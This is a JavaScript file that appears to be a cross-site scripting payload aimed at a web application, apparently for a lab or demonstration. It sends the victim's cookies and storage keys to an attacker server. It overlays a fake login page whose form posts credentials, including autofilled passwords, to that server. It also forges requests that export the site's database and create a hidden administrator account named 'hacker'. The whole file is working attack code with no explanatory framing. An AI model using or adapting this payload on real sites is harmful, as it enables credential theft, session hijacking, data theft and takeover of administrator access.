// alert('hiiiiiii from a 3rd party server!');

const SERVER_BASE_URL = "http://server";
const LOGIN_PAGE_URL = "http://target/login";

async function sendBrowserData() {
  try {
    // console.log("sending browser data...");
    await sendEvent("sending browser data...");

    await fetch(`${SERVER_BASE_URL}/browser-data`, {
      body:
        "cookie=" +
        encodeURIComponent(document.cookie) +
        "&sessionStorage=" +
        encodeURIComponent(Object.keys(sessionStorage)) +
        "&localStorage=" +
        encodeURIComponent(Object.keys(localStorage)),
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      method: "POST",
    });
  } catch (e) {
    await sendError("send browser data - " + e.message);
  }
}

async function sendFieldValues() {
  try {
    // console.log("sending form values...");
    await sendEvent("sending form values...");

    const usernameInput = document.getElementsByTagName("input")[2];
    const passwordInput = document.getElementsByTagName("input")[3];

    await fetch(`${SERVER_BASE_URL}/login`, {
      body:
        "username=" +
        encodeURIComponent(usernameInput.value) +
        "&password=" +
        encodeURIComponent(passwordInput.value),
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      method: "POST",
    });
  } catch (e) {
    await sendError("send field values - " + e.message);
  }
}

async function sendError(message) {
  try {
    // console.log("sending error...");
    // await sendEvent("sending error...");

    await fetch(`${SERVER_BASE_URL}/error`, {
      body: "message=" + encodeURIComponent(message),
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      method: "POST",
    });
  } catch (e) {
    console.log(e.message);
  }
}

async function sendEvent(message) {
  try {
    // console.log("sending event...");

    await fetch(`${SERVER_BASE_URL}/event`, {
      body: "message=" + encodeURIComponent(message),
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      method: "POST",
    });
  } catch (e) {
    console.log(e.message);
  }
}

async function getLoginPageHTML() {
  try {
    const response = await fetch(LOGIN_PAGE_URL);
    const html = await response.text();

    return html;
  } catch (e) {
    await sendError("get login html - " + e);
  }
}

async function showFakePage() {
  try {
    const documentHTML = document.getElementsByTagName("html")[0];

    // Display login page
    const html = await getLoginPageHTML();

    await sendEvent("Showing fake page...");
    documentHTML.innerHTML = html;

    // Change login form action to evil server
    const loginForm = document.getElementsByTagName("form")[2];

    loginForm.action = `${SERVER_BASE_URL}/login`;

    sendFieldValues();

    // Attmept to get password from any autofillers, after a pause
    setTimeout(function () {
      sendFieldValues();
    }, 5000);
  } catch (e) {
    await sendError("show fake page - " + e.message);
  }
}

async function csrf({ url, method, headers, body }) {
  try {
    // console.log("sending csrf...");

    const res = await fetch(url, {
      body,
      headers,
      method,
    });

    const text = await res.text();

    await sendEvent(text);
  } catch (e) {
    await sendError("csrf - " + e.message);
  }
}

sendBrowserData();
showFakePage();

// Export database
csrf({ url: `${TARGET_BASE_URL}/admin/export`, method: "GET" });

// Create a new admin user
csrf({
  url: `${TARGET_BASE_URL}/admin/users/create`,
  method: "POST",
  body: "name=hacker&email=hacker@answers.local&isAdmin=true&isMod=true",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded",
  },
});

